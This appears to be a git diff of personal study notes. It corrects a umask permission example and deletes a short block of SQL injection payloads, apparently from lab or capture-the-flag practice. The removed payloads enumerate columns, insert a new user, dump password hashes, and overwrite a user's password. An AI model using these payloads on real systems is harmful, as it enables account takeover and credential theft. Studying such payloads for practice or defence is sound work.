@@ -64,7 +64,7 @@ After mask :  755   (drwxr-xr-x)  |   644    (-rw-r--r--)
                     folder        |            file
 Before mask:  777   (drwxrwxrwx)  |   666    (-rw-rw-rw-)   
 Operations : -027   (==========)  |  -027    (==========)   
-After mask :  750   (drwxr-xr-x)  |   640    (-rw-r--r--)    
+After mask :  750   (drwxr-x---)  |   640    (-rw-r-----)    
 ```
 
 **Note that in the last example the file permissions are different than we could expect.** This is because we do not perform an arithmetic subtraction of the UMASK from the default permissions but rather subtract each octal value in the corresponding position. If the result of the subtraction is negative, it defaults to the lowest permissions possible, which is 0. So we have:
@@ -74,23 +74,3 @@ After mask :  750   (drwxr-xr-x)  |   640    (-rw-r--r--)
 --------
  6  4  0
 ``` 
-
-view all column names of table members
-```
-' AND 1=2 UNION SELECT COLUMN_NAME,NULL,NULL,NULL FROM INFORMATION_SCHEMA.columns WHERE TABLE_NAME = "members";
-```
-
-insert your own user
-```
-%'; INSERT INTO members (Username, Name, email, Password) VALUES ("flying_buffallo", "Mr. Buffallo", "buffallo@flying.de", "crackme" );
-```
-
-view all users and their password hashes
-```
-' AND 1=2 UNION SELECT Username, Password, NULL, NULL FROM members;
-```
-
-Update the password of the user sam
-```
-'; UPDATE members SET Password = "4b6ad7d194518aac02b072e6179dbf1e69ffa7ba" WHERE Username = "sam";
-```
